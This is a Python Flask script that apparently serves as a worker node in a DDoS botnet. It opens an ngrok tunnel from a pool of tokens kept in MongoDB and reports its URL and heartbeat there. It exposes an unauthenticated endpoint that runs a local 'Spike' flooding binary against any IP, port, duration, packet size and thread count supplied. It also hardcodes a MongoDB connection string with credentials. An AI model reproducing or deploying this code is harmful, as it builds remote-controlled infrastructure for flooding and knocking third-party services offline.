import os
import random
import subprocess
import threading
import time
from flask import Flask, request, jsonify
from pyngrok import ngrok
from pymongo import MongoClient

app = Flask(__name__)

# MongoDB setup
client = MongoClient("mongodb+srv://BLACKHAT:PRODUCTION@cluster0.0sa8e.mongodb.net/PRODUCTION?retryWrites=true&w=majority&appName=Cluster0")
db = client["PRODUCTION"]
tokens_collection = db["ngrok_tokens"]
ngrok_collection = db["urls"]
heartbeat_collection = db["heartbeats"]

# Generate random VPS ID
VPS_ID = f"VPS-{random.randint(1000, 9999)}"
print(f"Generated VPS ID: {VPS_ID}")

def get_unused_token():
    """
    Fetches an unused Ngrok token from MongoDB.
    """
    token_doc = tokens_collection.find_one_and_update(
        {"used": False},
        {"$set": {"used": True}},  
        return_document=True
    )
    if not token_doc:
        raise Exception("No unused Ngrok tokens available in MongoDB!")
    return token_doc["token"]

def mark_token_unused(token):
    """
    Marks the Ngrok token as unused in MongoDB.
    """
    tokens_collection.update_one({"token": token}, {"$set": {"used": False}})
    print(f"Token {token} marked as unused.")

try:
    # Setup Ngrok
    NGROK_AUTH_TOKEN = get_unused_token()
    print(f"Using Ngrok token: {NGROK_AUTH_TOKEN}")
    ngrok.set_auth_token(NGROK_AUTH_TOKEN)
    random_port = random.randint(1000, 65535)
    tunnel = ngrok.connect(random_port)
    public_url = tunnel.public_url
    print(f" * Ngrok tunnel \"{public_url}\" -> \"http://127.0.0.1:{random_port}\"")
    ngrok_collection.update_one(
        {"_id": "ngrok_urls"},
        {"$addToSet": {"urls": public_url}}, 
        upsert=True
    )
    print("Ngrok public URL saved to MongoDB")

except Exception as e:
    print(f"Failed to set up Ngrok: {str(e)}")
    exit(1)

@app.route('/run_Spike', methods=['POST'])
def run_spike():
    """
    Endpoint to run the Spike script with the provided parameters.
    """
    data = request.get_json()
    ip = data.get("ip")
    port = data.get("port")
    duration = data.get("time")
    packet_size = data.get("packet_size")
    threads = data.get("threads")

    if not (ip and port and duration and packet_size and threads):
        return jsonify({"error": "Missing required parameters (ip, port, time, packet_size, threads)"}), 400

    try:
        result = subprocess.run(
            ["./Spike", ip, str(port), str(duration), str(packet_size), str(threads)],
            capture_output=True, text=True
        )

        output = result.stdout
        error = result.stderr
        return jsonify({"output": output, "error": error, "vps_id": VPS_ID})

    except Exception as e:
        return jsonify({"error": f"Failed to run Spike: {str(e)}", "vps_id": VPS_ID}), 500

@app.route('/vps_id', methods=['GET'])
def get_vps_id():
    """
    Endpoint to fetch the VPS ID.
    """
    return jsonify({"vps_id": VPS_ID})

def send_heartbeat():
    """
    Sends periodic heartbeats to MongoDB with the VPS status.
    """
    while True:
        heartbeat_collection.update_one(
            {"vps_id": VPS_ID},
            {"$set": {
                "last_seen": time.time(),
                "url": public_url,
                "token": NGROK_AUTH_TOKEN  
            }},
            upsert=True
        )
        time.sleep(15)  

# Start heartbeat thread
heartbeat_thread = threading.Thread(target=send_heartbeat, daemon=True)
heartbeat_thread.start()

if __name__ == '__main__':
    try:
        print(f"Server running at public URL: {public_url}/run_spike")
        app.run(port=random_port)
    finally:
        mark_token_unused(NGROK_AUTH_TOKEN)
